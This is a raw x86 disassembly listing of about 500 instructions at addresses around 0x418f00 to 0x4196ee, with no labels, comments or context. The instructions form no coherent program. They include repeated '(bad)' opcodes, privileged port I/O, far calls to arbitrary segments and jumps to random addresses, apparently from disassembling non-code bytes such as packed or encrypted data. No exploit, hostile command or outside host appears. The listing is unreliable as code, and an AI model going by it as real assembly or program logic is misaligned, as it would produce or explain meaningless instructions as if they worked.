  418f02:	in     al,dx
  418f03:	mov    ds:0x93f80d54,al
  418f08:	cwde   
  418f09:	jge    0x418ebc
  418f0b:	add    esi,DWORD PTR [ebx]
  418f0d:	push   ds
  418f0e:	and    bh,BYTE PTR [ebx+0x4235205c]
  418f14:	dec    edx
  418f15:	push   edx
  418f16:	js     0x418ea3
  418f18:	test   DWORD PTR [ebx],ecx
  418f1a:	in     eax,0x99
  418f1c:	or     edi,eax
  418f1e:	xchg   edx,eax
  418f1f:	mov    dl,al
  418f21:	jge    0x418ebe
  418f23:	dec    esp
  418f24:	arpl   sp,bp
  418f26:	cmp    dl,0x5e
  418f29:	sbb    bh,BYTE PTR [esi-0x10]
  418f2c:	clc    
  418f2d:	shl    DWORD PTR [esi],0x54
  418f30:	inc    edx
  418f31:	cmp    bl,0xb5
  418f34:	mov    WORD PTR [ebx+0x9f37da4],cs
  418f3a:	and    BYTE PTR [esi-0x51b1e434],bl
  418f40:	adc    bh,BYTE PTR [esi+0x132cf2d8]
  418f46:	push   ds
  418f47:	dec    ecx
  418f48:	or     esp,ebp
  418f4a:	es pop ds
  418f4c:	and    DWORD PTR [eax],edi
  418f4e:	mov    eax,0x6d745f8e
  418f53:	ret    0xf0ac
  418f56:	fwait
  418f57:	icebp  
  418f58:	scas   eax,DWORD PTR es:[edi]
  418f59:	sbb    ch,BYTE PTR [esi+edx*4]
  418f5c:	or     DWORD PTR [ebx+0x67ed5e33],edx
  418f62:	mov    ss:0x86c4f1a5,al
  418f68:	test   BYTE PTR [ecx-0x61184cb1],ah
  418f6e:	cmp    eax,0x2c1ac0ed
  418f73:	xor    bl,ah
  418f75:	and    bl,BYTE PTR [ebp-0x2a]
  418f78:	aas    
  418f79:	in     eax,0x8
  418f7b:	push   0x615edf8b
  418f80:	into   
  418f81:	mov    eax,0xeb8f6165
  418f86:	jno    0x418f4c
  418f88:	mov    ecx,0xed218db1
  418f8d:	ror    DWORD PTR [edi],0xbb
  418f90:	std    
  418f91:	test   al,0x28
  418f93:	ins    BYTE PTR es:[edi],dx
  418f94:	add    eax,0x4b7b68e0
  418f99:	mov    bh,0x81
  418f9b:	outs   dx,DWORD PTR ds:[esi]
  418f9c:	fsub   st(6),st
  418f9e:	repz fnsave [edx-0x74]
  418fa2:	push   edi
  418fa3:	mov    al,ds:0x21f214ef
  418fa8:	sahf   
  418fa9:	iret   
  418faa:	ja     0x418f40
  418fac:	dec    esp
  418fae:	pop    esp
  418faf:	add    eax,0x2a7eaddc
  418fb4:	fistp  DWORD PTR [edx]
  418fb6:	fstp   DWORD PTR [eax]
  418fb8:	pop    esp
  418fb9:	je     0x418fcd
  418fbb:	les    ebp,FWORD PTR ds:0x9b507443
  418fc1:	inc    DWORD PTR [eax]
  418fc3:	bound  esi,QWORD PTR [edx]
  418fc5:	mov    cl,BYTE PTR [edi]
  418fc7:	xor    DWORD PTR [edx+0x43],esi
  418fca:	cmc    
  418fcb:	lods   eax,DWORD PTR ds:[esi]
  418fcc:	scas   eax,DWORD PTR es:[edi]
  418fcd:	mov    esi,0x86968157
  418fd2:	inc    edi
  418fd3:	arpl   WORD PTR [ebx-0x21],cx
  418fd6:	or     bl,ah
  418fd8:	or     al,0x2f
  418fda:	inc    esp
  418fdb:	test   BYTE PTR [edi],ah
  418fdd:	adc    DWORD PTR ds:0xbb5b6e8b,0x5c
  418fe4:	fdivr  QWORD PTR [edx+edi*4+0x41]
  418fe8:	test   eax,0xd0ce984d
  418fed:	sbb    eax,0xda86b985
  418ff2:	iret   
  418ff3:	nop
  418ff4:	repnz imul ecx,esi,0x63
  418ff8:	cli    
  418ff9:	and    ebp,edx
  418ffb:	and    DWORD PTR [edx+ecx*8+0x65],edi
  418fff:	inc    ebp
  419000:	aaa    
  419001:	das    
  419002:	xor    bh,cl
  419004:	sar    edx,1
  419006:	inc    edi
  419007:	ss ins BYTE PTR es:[edi],dx
  419009:	rcr    DWORD PTR ds:0xf262c31d,cl
  41900f:	push   ss
  419010:	test   al,0xac
  419012:	pop    esi
  419013:	inc    ebp
  419014:	fidivr WORD PTR [esi+edi*8]
  419017:	cmp    DWORD PTR [ecx-0x580e3a8a],ebp
  41901d:	adc    edx,DWORD PTR [edi+0x31]
  419020:	rcr    bl,cl
  419022:	push   es
  419023:	sub    eax,0x3e20e5ae
  419028:	retf   
  419029:	stc    
  41902a:	dec    ebx
  41902b:	adc    eax,DWORD PTR [ecx-0x7f]
  41902e:	and    eax,0xe90df832
  419033:	inc    edx
  419034:	scas   al,BYTE PTR es:[edi]
  419035:	retf   
  419036:	dec    ebp
  419037:	dec    edi
  419038:	cmp    eax,DWORD PTR [ebp+ecx*2-0x70b3e69]
  41903f:	mov    ds:0x6ef99770,al
  419044:	jmp    0xedf23f9
  419049:	stc    
  41904a:	add    eax,0x8ae64e69
  41904f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419050:	je     0x419076
  419052:	leave  
  419053:	ror    DWORD PTR [eax-0x75],0xc2
  419057:	and    esi,DWORD PTR [edi-0x7f]
  41905a:	lahf   
  41905b:	jle    0x4190c6
  41905d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41905e:	jle    0x41901f
  419060:	mov    bh,0xa3
  419062:	ror    BYTE PTR [esi],cl
  419064:	xchg   ebp,eax
  419065:	outs   dx,BYTE PTR ds:[esi]
  419066:	add    DWORD PTR [esi],eax
  419068:	icebp  
  419069:	xchg   edi,eax
  41906a:	shr    BYTE PTR [edi],cl
  41906c:	mov    ch,BYTE PTR [ebp+0x1d437db6]
  419072:	cdq    
  419073:	pop    eax
  419074:	and    al,0x91
  419076:	fidiv  WORD PTR [esi+ecx*4]
  419079:	ret    0x265f
  41907c:	fild   WORD PTR [eax+ecx*2-0x480b993b]
  419083:	xor    ebp,DWORD PTR [edi-0x6fbbd9f8]
  419089:	and    BYTE PTR [eax],al
  41908b:	adc    BYTE PTR [eax-0x53],al
  41908e:	or     al,BYTE PTR [esi]
  419090:	sti    
  419091:	pop    edx
  419092:	cmp    eax,DWORD PTR [edi+0x6a]
  419095:	lods   al,BYTE PTR ds:[esi]
  419096:	push   ebp
  419097:	push   eax
  419098:	add    al,0xe6
  41909a:	cli    
  41909b:	and    dh,ch
  41909d:	pop    ecx
  41909e:	clc    
  41909f:	call   0x58a665fd
  4190a4:	(bad)  
  4190a5:	dec    edx
  4190a6:	add    esi,DWORD PTR [ebp+0x43]
  4190a9:	sub    al,0x71
  4190ab:	dec    ebx
  4190ac:	outs   dx,DWORD PTR ds:[esi]
  4190ad:	mov    edx,0x8d446af0
  4190b2:	enter  0xf35,0x77
  4190b6:	xchg   esp,eax
  4190b7:	mov    cl,BYTE PTR [eax+ebx*1+0x5c]
  4190bb:	into   
  4190bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190bd:	mov    al,0xdf
  4190bf:	in     al,0xc4
  4190c1:	or     ch,BYTE PTR [edx+0x2b187f08]
  4190c7:	sbb    ch,BYTE PTR [edi-0x1]
  4190ca:	sahf   
  4190cb:	addr16 int3 
  4190cd:	add    dh,BYTE PTR [edx]
  4190cf:	pop    ss
  4190d0:	les    edi,FWORD PTR [edx+0xa59baa7]
  4190d6:	add    eax,0xdd2362a1
  4190db:	inc    ebx
  4190dc:	sar    BYTE PTR [ebx+0x2b4cf64b],0x86
  4190e3:	pop    ecx
  4190e4:	inc    edi
  4190e5:	xor    eax,0xeb878ed1
  4190ea:	dec    ebx
  4190eb:	pop    ecx
  4190ec:	sbb    dl,BYTE PTR [eax]
  4190ee:	out    dx,eax
  4190ef:	xchg   edi,edi
  4190f1:	(bad)  
  4190f2:	ins    BYTE PTR es:[edi],dx
  4190f3:	mov    ebp,0x53d57b30
  4190f8:	xchg   DWORD PTR [ebx-0x77ae5f15],esi
  4190fe:	jo     0x419085
  419100:	jne    0x419168
  419102:	pusha  
  419103:	retf   
  419104:	push   esp
  419105:	addr16 mov dl,0xcf
  419108:	cs pop ebx
  41910a:	aas    
  41910b:	ins    DWORD PTR es:[edi],dx
  41910c:	mov    eax,ds:0x204ee120
  419111:	or     DWORD PTR [ecx+edx*8-0x61b774e5],edx
  419118:	test   BYTE PTR [ecx+0xe],dl
  41911b:	or     BYTE PTR [edi],dh
  41911d:	pop    es
  41911e:	call   0x463bbc29
  419123:	push   es
  419124:	test   DWORD PTR [edi-0x5b],0xdb40355d
  41912b:	mov    al,0xcf
  41912d:	jnp    0x419163
  41912f:	pop    es
  419130:	in     al,dx
  419131:	vpunpcklwd ymm2,ymm5,YMMWORD PTR [ebx]
  419135:	cmp    al,0xf9
  419137:	sbb    al,0xbb
  419139:	jg     0x419135
  41913b:	mov    ebx,0x88021965
  419140:	call   0x785a24db
  419145:	xchg   ebx,eax
  419146:	pop    ebx
  419147:	xor    eax,0xb24b9433
  41914c:	adc    ebp,DWORD PTR [edx+0x76]
  41914f:	jge    0x419109
  419151:	mov    fs,WORD PTR [ebx]
  419153:	or     eax,0x8b76ceb2
  419158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419159:	(bad)  
  41915a:	aas    
  41915b:	xchg   edi,eax
  41915c:	mov    esi,0x3fe6518a
  419161:	jb     0x419137
  419163:	add    BYTE PTR [esi-0x70],dl
  419166:	push   eax
  419167:	repnz adc eax,0x12fcc11f
  41916d:	mov    edi,0x2a8a5d5e
  419172:	stc    
  419173:	add    ebx,DWORD PTR [ebp-0x63]
  419176:	hlt    
  419177:	push   0x4
  419179:	sbb    al,0x41
  41917b:	ret    0xf3f9
  41917e:	push   0x61
  419180:	mov    edi,0x8ec57607
  419185:	mov    ecx,0x99047745
  41918a:	jb     0x41917d
  41918c:	and    eax,0xf872ebe7
  419191:	fwait
  419192:	dec    edi
  419193:	fwait
  419194:	inc    eax
  419195:	and    esi,0x471a71a
  41919b:	xor    dh,BYTE PTR fs:[ecx+0x37f86240]
  4191a2:	cs add al,0x49
  4191a5:	or     eax,0x7e35a77e
  4191aa:	inc    edi
  4191ab:	xchg   ebp,eax
  4191ac:	mov    DWORD PTR [ecx],ecx
  4191ae:	xor    BYTE PTR [edx-0x4df3467e],bh
  4191b4:	mov    al,ds:0x92006bf6
  4191b9:	(bad)  
  4191bb:	les    edi,FWORD PTR [eax-0x74]
  4191be:	addr16 dec ecx
  4191c0:	lods   al,BYTE PTR ds:[esi]
  4191c1:	ficom  DWORD PTR [ebx]
  4191c3:	push   esi
  4191c4:	push   cs
  4191c5:	pop    ebp
  4191c6:	jne    0x419209
  4191c8:	aaa    
  4191c9:	outs   dx,DWORD PTR ds:[esi]
  4191ca:	mov    eax,0x94c3a32c
  4191cf:	jge    0x419199
  4191d1:	cmp    eax,0xb62ce47a
  4191d6:	cmp    BYTE PTR [ecx-0x70e2e0a8],0x3a
  4191dd:	jb     0x419226
  4191df:	nop
  4191e0:	jb     0x419261
  4191e2:	adc    eax,0x837ac34e
  4191e7:	inc    ebx
  4191e8:	sbb    edx,DWORD PTR [ecx+0x9]
  4191eb:	jae    0x41918b
  4191ed:	imul   edi,DWORD PTR [edx],0x2f
  4191f0:	dec    eax
  4191f1:	ret    0x99b7
  4191f4:	or     eax,0xc22ed381
  4191f9:	fbld   TBYTE PTR [ebp-0x2a]
  4191fc:	test   al,0x6
  4191fe:	adc    BYTE PTR [eax],al
  419200:	fnstenv [eax+0x30]
  419203:	inc    esi
  419204:	inc    esi
  419205:	(bad)  
  419206:	and    ebp,DWORD PTR ds:0x91989354
  41920c:	jb     0x419195
  41920e:	fldenv [edi-0x67]
  419211:	pop    es
  419212:	inc    eax
  419213:	push   edx
  419214:	xor    al,0x58
  419216:	(bad)  
  419217:	je     0x41924b
  419219:	jle    0x419249
  41921b:	cs ins DWORD PTR es:[edi],dx
  41921d:	out    dx,al
  41921e:	jecxz  0x419263
  419220:	ret    
  419221:	mov    eax,ds:0x6dec828a
  419226:	inc    edi
  419227:	sub    BYTE PTR [ecx],ch
  419229:	xchg   esi,eax
  41922a:	xor    cl,BYTE PTR [esi]
  41922c:	adc    DWORD PTR [esi+0x6f904343],0xdd806783
  419236:	pop    eax
  419237:	or     eax,DWORD PTR [eax+0x4f3890e]
  41923d:	dec    DWORD PTR [edi]
  41923f:	mov    ecx,DWORD PTR [ebp-0x32403532]
  419245:	rol    DWORD PTR [edi],cl
  419247:	adc    al,0x48
  419249:	fcom   DWORD PTR [edi+0x4a20ce3c]
  41924f:	mov    dh,0xd5
  419251:	lods   eax,DWORD PTR ds:[esi]
  419252:	lea    eax,[edi+0x24b221b8]
  419258:	scas   al,BYTE PTR es:[edi]
  419259:	mov    dl,0xbe
  41925b:	clc    
  41925c:	add    eax,0x929dd2c
  419261:	mul    BYTE PTR [esi]
  419263:	mov    WORD PTR [eax+edx*2+0x7ba1a062],?
  41926a:	jge    0x4192cd
  41926c:	jp     0x4192af
  41926e:	pop    edi
  41926f:	in     eax,0x3a
  419271:	sub    eax,0x877817fb
  419276:	adc    bh,dh
  419278:	shr    DWORD PTR [edx],cl
  41927a:	(bad)  [edx-0x6e]
  41927d:	jnp    0x4192a0
  41927f:	push   0xa9d29faf
  419284:	(bad)  
  419286:	mov    bl,0xdc
  419288:	fiadd  DWORD PTR [ecx+0x533407c8]
  41928e:	add    DWORD PTR [ecx],ebp
  419290:	fs ret 
  419292:	dec    esp
  419293:	jno    0x419251
  419295:	jns    0x4192ab
  419297:	xor    cl,0x4c
  41929a:	addr16 push esi
  41929c:	fild   QWORD PTR [ecx-0x34d408c0]
  4192a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192a3:	ja     0x4192cf
  4192a5:	adc    al,0x6e
  4192a7:	or     edi,DWORD PTR [esi+ecx*1]
  4192aa:	inc    esp
  4192ab:	push   0x507750df
  4192b0:	ss push ds
  4192b2:	and    ebx,DWORD PTR [edx+ecx*4-0x498c34e]
  4192b9:	push   ss
  4192ba:	clc    
  4192bb:	xchg   edi,ebp
  4192bd:	adc    ah,BYTE PTR [ebx]
  4192bf:	add    DWORD PTR [ecx+ebx*1],ecx
  4192c2:	jns    0x41927e
  4192c4:	or     ebp,edx
  4192c6:	xchg   esi,eax
  4192c7:	jle    0x419272
  4192c9:	mov    ch,0x8b
  4192cb:	popf   
  4192cc:	fdiv   DWORD PTR ds:0xb9e06c09
  4192d2:	ins    BYTE PTR es:[edi],dx
  4192d3:	mov    DWORD PTR ds:0x3b34958a,edi
  4192d9:	push   edi
  4192da:	adc    esp,edx
  4192dc:	loopne 0x4192dc
  4192de:	bound  esi,QWORD PTR [esi-0x5a]
  4192e1:	pop    esi
  4192e2:	jns    0x41927b
  4192e4:	fidiv  WORD PTR [esi+ebx*4+0x23796ae9]
  4192eb:	and    dh,BYTE PTR [edx+0x68caa911]
  4192f1:	out    dx,eax
  4192f2:	aaa    
  4192f3:	rcr    DWORD PTR [esi+0x3a973c61],1
  4192f9:	sub    DWORD PTR [edx],ecx
  4192fb:	fwait
  4192fc:	pop    ebp
  4192fd:	scas   eax,DWORD PTR es:[edi]
  4192fe:	je     0x41933e
  419300:	rcr    DWORD PTR [ecx],1
  419302:	test   eax,0x895e6924
  419307:	leave  
  419308:	ins    BYTE PTR es:[edi],dx
  419309:	mov    bl,0x8e
  41930b:	(bad)  
  41930c:	xor    ecx,eax
  41930e:	(bad)  
  41930f:	pop    esp
  419310:	nop
  419311:	sub    al,0xbd
  419313:	call   0xcd014e02
  419318:	imul   esi,DWORD PTR [eax],0xffffff8d
  41931b:	cs jmp 0x419348
  41931e:	mov    dh,BYTE PTR [edx+0x12096846]
  419324:	jae    0x419311
  419326:	push   0x6eb1da4b
  41932b:	gs pushf 
  41932d:	pop    ss
  41932e:	jmp    0xe464:0x7a742abf
  419335:	in     eax,dx
  419336:	ins    DWORD PTR es:[edi],dx
  419337:	imul   esi,DWORD PTR [ebp+0x57],0xffffffe2
  41933b:	push   ecx
  41933c:	inc    eax
  41933d:	add    DWORD PTR [edx+0x65019ca5],ecx
  419343:	xchg   ecx,eax
  419344:	dec    ebx
  419345:	test   dl,bl
  419347:	or     al,0xca
  419349:	and    eax,0x12a44c72
  41934e:	stos   DWORD PTR es:[edi],eax
  41934f:	and    DWORD PTR [edx+0x76],0x4f0f08cd
  419356:	pushw  ds
  419358:	pop    esi
  419359:	inc    edi
  41935a:	mul    BYTE PTR ds:0xdcdce7ea
  419360:	test   BYTE PTR [ebx+0x4d],dl
  419363:	sbb    eax,0xdd26974e
  419368:	pop    edx
  419369:	arpl   WORD PTR [ecx-0x3b],sp
  41936c:	test   ebp,ebp
  41936e:	call   0xa634:0x8276cb9c
  419375:	xor    DWORD PTR [edx+edi*8-0x218b9a2],0x77924c46
  419380:	jle    0x419319
  419382:	fild   QWORD PTR [edi]
  419384:	jnp    0x419311
  419386:	leave  
  419387:	sbb    al,0x93
  419389:	sub    al,0x44
  41938b:	cs out dx,al
  41938d:	add    al,0x76
  41938f:	sub    edx,edx
  419391:	and    eax,0xabe93d9f
  419396:	in     eax,0x17
  419398:	jg     0x41932c
  41939a:	push   cs
  41939b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41939c:	sti    
  41939d:	cmc    
  41939e:	mov    ebp,0xa63fe60a
  4193a3:	fadd   st,st(7)
  4193a5:	(bad)  
  4193a6:	jbe    0x4193e9
  4193a8:	sub    al,0xdf
  4193aa:	mov    ebx,0xb95e8380
  4193af:	dec    ebx
  4193b0:	sbb    DWORD PTR [ecx],edx
  4193b2:	push   0x49520a2d
  4193b7:	mov    eax,ds:0x949dacd0
  4193bc:	std    
  4193bd:	or     BYTE PTR [eax],ah
  4193bf:	and    ebp,DWORD PTR [edi-0x4292f2ee]
  4193c5:	out    0xd6,al
  4193c7:	cld    
  4193c8:	jb     0x4193fa
  4193ca:	jnp    0x4193e2
  4193cc:	adc    DWORD PTR [edx-0x74],esi
  4193cf:	out    0x6d,eax
  4193d1:	sti    
  4193d2:	ja     0x41936e
  4193d4:	icebp  
  4193d5:	push   cs
  4193d6:	aaa    
  4193d7:	xchg   ecx,eax
  4193d8:	test   DWORD PTR [eax-0x15a7f902],ecx
  4193de:	aad    0x63
  4193e0:	xchg   esi,eax
  4193e1:	jg     0x41940b
  4193e3:	mov    ds:0x78a8d7a7,al
  4193e8:	ror    DWORD PTR [esi+0x33fdd984],0x55
  4193ef:	push   0xffffffef
  4193f1:	fbld   TBYTE PTR [esi-0x37dc9c47]
  4193f7:	mov    dh,0x1
  4193f9:	xchg   ebp,eax
  4193fa:	adc    eax,0x30aff3b8
  4193ff:	mov    ebp,0xaddbfeb7
  419404:	sahf   
  419405:	sub    bh,BYTE PTR [ebp-0x2b0e58db]
  41940b:	sbb    DWORD PTR [ecx],ebx
  41940d:	and    eax,0x8e97436f
  419412:	fs jns 0x4193f5
  419415:	add    esp,DWORD PTR [edi]
  419417:	out    dx,al
  419418:	inc    esi
  419419:	lock mov edx,0xab936f75
  41941f:	loope  0x419420
  419421:	push   ebx
  419422:	dec    edx
  419423:	(bad)
  419427:	push   es
  419428:	jmp    0x4194a4
  41942a:	jmp    0x419447
  41942c:	pop    ss
  41942d:	cld    
  41942e:	xor    edx,edi
  419430:	into   
  419431:	fwait
  419432:	mov    dh,BYTE PTR [ebx+0x58]
  419435:	loopne 0x41948c
  419437:	les    esp,FWORD PTR [ebp+0x749a3052]
  41943d:	mov    edx,0xaac57f
  419442:	clc    
  419443:	push   ss
  419444:	xchg   BYTE PTR [ebp-0x438bb0b0],ah
  41944a:	ins    BYTE PTR es:[edi],dx
  41944b:	aad    0xaa
  41944d:	jge    0x41949f
  41944f:	adc    BYTE PTR [edx-0x49],bh
  419452:	push   0xffffffff
  419454:	jmp    0x419426
  419456:	leave  
  419457:	sbb    ecx,DWORD PTR [edx]
  419459:	push   esi
  41945a:	xchg   BYTE PTR [edx+edx*1],dl
  41945d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41945e:	outs   dx,BYTE PTR ds:[esi]
  41945f:	test   DWORD PTR [ecx+0x41],ebx
  419462:	push   edx
  419463:	xchg   BYTE PTR [ebx+edi*2+0x73],al
  419467:	mov    bl,0x91
  419469:	test   DWORD PTR [ebx+0x3cc005af],ecx
  41946f:	outs   dx,BYTE PTR ds:[esi]
  419470:	inc    ecx
  419471:	jp     0x41941e
  419473:	push   cs
  419474:	clc    
  419475:	jb     0x4194db
  419477:	pop    ebp
  419478:	test   eax,0x5429df5a
  41947d:	lock in eax,dx
  41947f:	out    0xd8,al
  419481:	lock xchg ecx,eax
  419483:	dec    edx
  419484:	xor    BYTE PTR [edx+0x16],cl
  419487:	out    dx,al
  419488:	push   eax
  419489:	inc    ebx
  41948a:	add    al,BYTE PTR [edi]
  41948c:	add    al,bh
  41948e:	mov    edi,DWORD PTR [ebx]
  419490:	std    
  419491:	ins    BYTE PTR es:[edi],dx
  419492:	into   
  419493:	xor    eax,DWORD PTR [eax+0x77]
  419496:	and    al,ah
  419498:	or     DWORD PTR [ecx-0x73],ecx
  41949b:	mov    bh,0x38
  41949d:	mov    ebx,0x9e7d543a
  4194a2:	xchg   esp,eax
  4194a3:	mov    ebx,0xa11707f6
  4194a8:	xor    al,0x22
  4194aa:	mov    cl,0x8c
  4194ac:	mov    eax,ds:0x6ddfeb6b
  4194b1:	dec    eax
  4194b2:	outs   dx,DWORD PTR ds:[esi]
  4194b3:	jns    0x41944d
  4194b5:	pop    eax
  4194b6:	inc    esi
  4194b7:	aaa    
  4194b8:	enter  0xe0f8,0x76
  4194bc:	or     BYTE PTR [ebp-0x47d9bccb],dl
  4194c2:	sbb    al,0x63
  4194c4:	sbb    BYTE PTR [ebx],dl
  4194c6:	pop    edx
  4194c7:	(bad)  
  4194c8:	in     eax,0x8e
  4194ca:	jno    0x4194f9
  4194cc:	push   ebp
  4194cd:	mov    ebp,0xee02c2f2
  4194d2:	mov    WORD PTR [ecx-0x777deae8],fs
  4194d8:	mov    ds:0x5928d5a5,eax
  4194dd:	lods   al,BYTE PTR ds:[esi]
  4194de:	pop    ecx
  4194df:	inc    eax
  4194e0:	(bad)  
  4194e1:	aas    
  4194e2:	push   edx
  4194e3:	sub    DWORD PTR [edx+0x66c35333],ebp
  4194e9:	(bad)  
  4194ea:	mov    ah,0xf8
  4194ec:	aad    0x27
  4194ee:	icebp  
  4194ef:	mov    dl,0x85
  4194f1:	sbb    dh,BYTE PTR ds:0x1e499091
  4194f7:	outs   dx,BYTE PTR ds:[esi]
  4194f8:	stos   DWORD PTR es:[edi],eax
  4194f9:	jno    0x41949f
  4194fb:	shl    BYTE PTR [esi-0x3d57c0d],cl
  419501:	int3   
  419502:	out    dx,eax
  419503:	enter  0x3b8,0x25
  419507:	inc    esp
  419508:	das    
  419509:	pop    edx
  41950a:	jg     0x419567
  41950c:	xchg   esi,eax
  41950d:	mov    edx,DWORD PTR [edi]
  41950f:	retf   0xbe4e
  419512:	stc    
  419513:	inc    BYTE PTR [ebp-0x6b]
  419516:	hlt    
  419517:	adc    al,0xa8
  419519:	add    DWORD PTR [edi-0x6217520c],0x73
  419520:	cdq    
  419521:	push   ebx
  419522:	lahf   
  419523:	hlt    
  419524:	xchg   edi,eax
  419525:	in     eax,0xf9
  419527:	cdq    
  419528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419529:	pop    ecx
  41952a:	dec    esp
  41952b:	jmp    0xa7f4e5c
  419530:	bound  esi,QWORD PTR [ebx*4+0x6060d098]
  419537:	sahf   
  419538:	lea    ebp,[esi]
  41953a:	das    
  41953b:	xchg   esi,eax
  41953c:	pop    eax
  41953d:	push   ebp
  41953e:	mov    edi,0xb4140d5d
  419543:	or     ch,dh
  419545:	mov    bl,0x48
  419547:	pop    esi
  419548:	mov    ecx,0x1ed60339
  41954d:	mov    al,0x3b
  41954f:	(bad)  
  419550:	sti    
  419551:	push   ss
  419552:	mov    eax,0xd670f2cb
  419557:	cld    
  419558:	add    BYTE PTR [ecx+0x1a],ch
  41955b:	cli    
  41955c:	leave  
  41955d:	rol    ebx,0x29
  419560:	and    al,bh
  419562:	or     BYTE PTR [edx+eiz*4],ch
  419565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419567:	lahf   
  419568:	pop    edi
  419569:	mov    al,ds:0x25d13b46
  41956e:	inc    esi
  41956f:	jg     0x419594
  419571:	dec    ebp
  419572:	les    eax,FWORD PTR [eax]
  419574:	mov    ch,0x7a
  419576:	test   eax,0x811c72ad
  41957b:	call   0x1414:0x58a87eb3
  419582:	popa   
  419583:	cmp    al,0x2f
  419585:	xor    DWORD PTR [eax-0x76],esp
  419588:	fmul   DWORD PTR [edi]
  41958a:	popa   
  41958b:	int3   
  41958c:	cli    
  41958d:	stc    
  41958e:	xchg   ebx,eax
  41958f:	div    DWORD PTR [eax-0x14]
  419592:	mov    ebx,0x454d5ff2
  419597:	(bad)  
  419598:	outs   dx,BYTE PTR ds:[esi]
  419599:	icebp  
  41959a:	mov    BYTE PTR [ecx+0xb],al
  41959d:	mov    WORD PTR [edi],ds
  41959f:	add    BYTE PTR [edi+edi*8+0x5679d9c2],bl
  4195a6:	jo     0x419616
  4195a8:	ja     0x4195a7
  4195aa:	stos   DWORD PTR es:[edi],eax
  4195ab:	les    ebp,FWORD PTR [edi-0xc8221d8]
  4195b1:	mov    al,0x9b
  4195b3:	xchg   edx,eax
  4195b4:	into   
  4195b5:	clc    
  4195b6:	mov    al,0x8f
  4195b8:	and    ebx,0xffffffec
  4195bb:	adc    DWORD PTR [eax+0x27ab0827],ecx
  4195c1:	out    0xf6,al
  4195c3:	imul   edx,DWORD PTR [edx],0x3f
  4195c6:	test   eax,0x8a811b5a
  4195cb:	mov    edi,0x63b29061
  4195d0:	pop    ds
  4195d1:	(bad)  
  4195d2:	and    dh,bh
  4195d4:	icebp  
  4195d5:	icebp  
  4195d6:	lahf   
  4195d7:	push   es
  4195d8:	cmp    ah,al
  4195da:	call   0xca38351d
  4195df:	mov    ah,0xb1
  4195e1:	sbb    DWORD PTR [edi+0x29a747ef],ecx
  4195e7:	mov    ebp,?
  4195e9:	xlat   BYTE PTR ds:[ebx]
  4195ea:	(bad)  
  4195eb:	in     al,0xa0
  4195ed:	or     eax,0xed5cda3d
  4195f2:	or     ah,BYTE PTR [ebx]
  4195f4:	mov    edx,0x5f8f7bdf
  4195f9:	data16 mov cl,0xad
  4195fc:	shl    ch,0x5f
  4195ff:	retf   
  419600:	popf   
  419601:	out    0x2d,eax
  419603:	push   ebx
  419604:	mov    edx,0x6021a518
  419609:	pop    edx
  41960a:	dec    ebx
  41960b:	cmp    bl,cl
  41960d:	jecxz  0x4195f4
  41960f:	call   0x31f0a905
  419614:	test   BYTE PTR [bx+0x3b],cl
  419618:	xor    edi,DWORD PTR [eax-0x7a45fa79]
  41961e:	mov    gs,WORD PTR [eax-0x55fafd7b]
  419624:	in     al,0x3f
  419626:	sub    ebp,DWORD PTR [esi+eax*1+0x6f2df13c]
  41962d:	pusha  
  41962e:	mov    DWORD PTR [edi],edi
  419630:	pop    edx
  419631:	enter  0xe6a1,0xd8
  419635:	loopne 0x41965b
  419637:	mov    cl,BYTE PTR [ecx+edx*4]
  41963a:	ins    DWORD PTR es:[edi],dx
  41963b:	jo     0x4196b9
  41963d:	aaa    
  41963e:	add    al,0x2d
  419640:	das    
  419641:	mov    eax,0x8abf9ec2
  419646:	sbb    al,0x5
  419648:	pop    edi
  419649:	jle    0x41960b
  41964b:	pop    eax
  41964c:	or     DWORD PTR [edi],0x25f9beb7
  419652:	int3   
  419653:	pop    edx
  419654:	nop
  419655:	sahf   
  419656:	sbb    BYTE PTR [edx+0x61e03b57],ah
  41965c:	and    BYTE PTR [edx+0x29],0x73
  419660:	out    0xfb,eax
  419662:	sub    edi,DWORD PTR [esi+0x725ecd95]
  419668:	and    al,0xe
  41966a:	dec    edx
  41966b:	pop    ss
  41966c:	push   esi
  41966d:	les    eax,FWORD PTR [ecx+0x48]
  419670:	xor    al,0xbc
  419672:	rcl    BYTE PTR [ebx+0x401fd03a],1
  419678:	cmp    eax,0xfa7e1fac
  41967d:	mov    bl,0x4
  41967f:	lods   al,BYTE PTR ds:[esi]
  419680:	int    0x26
  419682:	hlt    
  419683:	mov    dl,0xff
  419685:	cmp    BYTE PTR [edx-0x2b70d93],al
  41968b:	adc    BYTE PTR [edi-0xa],bh
  41968e:	call   0xa29e:0xf4878cec
  419695:	imul   eax,DWORD PTR ss:[esi-0x57e8b13f],0x34d144c
  4196a0:	out    0x18,al
  4196a2:	fldenv [esi+0x704d4fdd]
  4196a8:	bound  eax,QWORD PTR [ecx]
  4196aa:	jo     0x41963e
  4196ac:	mov    ds:0xc2b16708,eax
  4196b1:	adc    bl,BYTE PTR [edx-0x3a]
  4196b4:	inc    ebp
  4196b5:	push   esi
  4196b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196b7:	fyl2xp1 
  4196b9:	xor    DWORD PTR [esi-0x36],edi
  4196bc:	mov    al,ds:0x2bf9ea00
  4196c1:	test   eax,0xadb17ec7
  4196c6:	jmp    0x41968c
  4196c8:	mov    ebp,0x8779d60a
  4196cd:	sbb    dh,BYTE PTR [edi+0x6d040fde]
  4196d3:	retf   
  4196d4:	xchg   ecx,eax
  4196d5:	push   ebx
  4196d6:	fcom   DWORD PTR [edx]
  4196d8:	scas   al,BYTE PTR es:[edi]
  4196d9:	call   0xa1b13ca4
  4196de:	bswap  eax
  4196e0:	jb     0x41968f
  4196e2:	lea    esi,[eax+0x57]
  4196e5:	fcomi  st,st(3)
  4196e7:	pop    ebx
  4196e8:	dec    ecx
  4196e9:	mov    ds:0x6be83639,eax
  4196ee:	xlat   BYTE PTR ds:[ebx]
